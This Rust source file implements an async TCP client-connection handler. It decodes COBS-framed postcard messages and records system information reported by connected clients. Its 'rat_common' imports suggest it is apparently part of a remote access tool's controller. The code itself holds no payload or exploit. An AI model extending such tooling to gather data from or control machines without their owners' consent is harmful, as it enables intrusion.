use std::collections::VecDeque;
use std::net::SocketAddr;
use std::sync::Arc;

use async_trait::async_trait;
use log::{debug, error};
use rat_common::messages::{ClientMessage, SystemInfo};
use rat_common::module::{Module, ModuleImpl, ModuleState};
use tokio::io::AsyncReadExt;
use tokio::net::TcpStream;
use tokio::net::tcp::{OwnedReadHalf, OwnedWriteHalf};
use tokio::sync::{Mutex, RwLock};

struct _TcpReader {
    pub read_stream: OwnedReadHalf,
    pub read_buf: [u8; 1024],
}

impl _TcpReader {
    pub async fn read(&mut self) -> anyhow::Result<usize> {
        Ok(self.read_stream.read(&mut self.read_buf).await?)
    }
}

pub struct ClientConnector {
    _reader: Mutex<_TcpReader>,
    _info: RwLock<Option<SystemInfo>>,
    _writer: Mutex<OwnedWriteHalf>,
    _peer: SocketAddr,
    _name: String,
    _total_read_buf: Mutex<VecDeque<u8>>,
    _state: Arc<ModuleState>,
}

impl ClientConnector {
    pub fn new(stream: TcpStream, peer: SocketAddr) -> Self {
        let (read_stream, write_stream) = stream.into_split();
        Self {
            _reader: Mutex::new(_TcpReader {
                read_stream,
                read_buf: [0; 1024],
            }),
            _info: RwLock::new(None),
            _writer: Mutex::new(write_stream),
            _peer: peer,
            _name: format!("ClientConnector [{peer}]"),
            _total_read_buf: Mutex::new(VecDeque::new()),
            _state: ModuleState::new(),
        }
    }

    async fn _process_message(&self, message: ClientMessage) -> anyhow::Result<()> {
        match message {
            ClientMessage::SystemInfoUpdate { info } => {
                self._info.write().await.replace(info);
            }
            _ => {}
        }

        Ok(())
    }
}

#[async_trait]
impl ModuleImpl for ClientConnector {
    type EventType = anyhow::Result<usize>;

    fn name(&self) -> &str {
        &self._name
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let mut reader = self._reader.lock().await;
        Ok(reader.read().await?)
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let mut size = 0;
        let closed = match event {
            Ok(0) => true,
            Ok(s) => {
                size = s;
                false
            }
            Err(e) => {
                error!("Error when reading from {}: {e}", self._peer);
                true
            }
        };

        if closed {
            debug!("Client {} disconnected", self._peer);
            self.stop();
            return Ok(());
        }

        let reader = self._reader.lock().await;
        let mut total_read_buf = self._total_read_buf.lock().await;
        let mut offset = total_read_buf.len();

        total_read_buf.extend(&reader.read_buf[..size]);
        while offset < total_read_buf.len() {
            if total_read_buf[offset] == 0 {
                let mut frame = total_read_buf.drain(..=offset).collect::<Vec<u8>>();
                offset = 0;

                match postcard::from_bytes_cobs::<ClientMessage>(&mut frame) {
                    Ok(message) => {
                        if let Err(e) = self._process_message(message).await {
                            error!("Error processing message from {}: {e}", self._peer);
                        }
                    }
                    Err(e) => {
                        error!("Received malformed message from {}: {e}", self._peer);
                    }
                }
            } else {
                offset += 1;
            }
        }

        Ok(())
    }
}
